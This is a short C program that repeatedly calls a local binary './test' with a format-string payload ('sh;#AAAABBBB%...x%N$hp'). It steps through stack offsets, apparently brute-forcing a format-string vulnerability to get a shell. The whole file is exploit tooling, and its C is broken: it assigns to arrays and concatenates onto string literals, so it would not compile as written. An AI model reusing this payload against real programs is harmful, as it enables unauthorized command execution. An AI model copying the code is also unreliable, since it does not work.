#include <unistd.h>

int main() {
  int idx = 100;
  while (idx > 0) {
    sleep(1);
    char offset1[10];
    sprintf(offset1, "%d", idx);
    char offsethalf1[100];
    offsethalf1 = strcat("./test \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x%", offset1);
    char offset2[10];
    sprintf(offset2, "%d", idx + 1);
    char offsethalf2[100];
    offsethalf2 = strcat("$hp%00000x%", offset2);
    char strWithOffsets[200];
    strWithOffsets = strcat(offsethalf1, offsethalf2);
    system(strcat(strWithOffsets, "$hp\")')\"");
    printf("\n");
    idx--;
  }
}
